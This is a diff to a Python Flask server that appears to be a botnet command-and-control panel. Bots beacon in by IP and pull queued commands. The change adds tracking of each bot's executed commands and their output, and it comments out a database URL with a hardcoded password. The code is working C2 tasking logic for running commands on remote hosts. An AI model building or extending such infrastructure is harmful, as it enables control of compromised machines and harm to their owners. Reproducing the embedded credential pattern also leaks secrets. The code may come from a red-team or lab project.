@@ -10,17 +10,18 @@ import sqlalchemy as db
 
 #os.system('docker-compose up  -d --build')
 #time.sleep(10)
-engine = db.create_engine('mysql+pymysql://admin:stardust@localhost:3306/Sovereignty')
-connection = engine.connect()
+#engine = db.create_engine('mysql+pymysql://admin:stardust@localhost:3306/Sovereignty')
+#connection = engine.connect()
 #metadata = db.MetaData()
 #sov = db.Table('Sovereignty', metadata, autoload=True, autoload_with=engine)
 #print(sov.columns.keys())
 
-insp = db.inspect(engine)
-db_list = insp.get_schema_names()
-print(db_list)
+#insp = db.inspect(engine)
+#db_list = insp.get_schema_names()
+#print(db_list)
 
 bots = defaultdict(list)
+botsExe = defaultdict(list)
 botLst = []
 app = Flask(__name__)
 auth = HTTPBasicAuth()
@@ -53,7 +54,7 @@ def index():
 	for bot in bots:
 		if bot not in botLst and bot != None:
 			botLst.append(bot)		
-	return render_template('form.html', command=command, botIP=botIP, bots=botLst, lastOutput=lastOutput)
+	return render_template('form.html', command=command, botIP=botIP, bots=botsExe)
 
 
 """
@@ -67,6 +68,7 @@ def beacon():
 	ip = request.args.get('ip')
 	if ip not in bots:
 		bots[ip] = []
+		botsExe[ip] = []
 	else:
 		return json.dumps(bots[ip])
 	return json.dumps('')
@@ -89,6 +91,7 @@ def confirm():
 	#Recieve commands executed and remove them from the queue
 	if cmd in bots[ip]:
 		bots[ip].remove(cmd)
+		botsExe[ip].append((cmd, output.strip()))
 	return 'True'
 
 
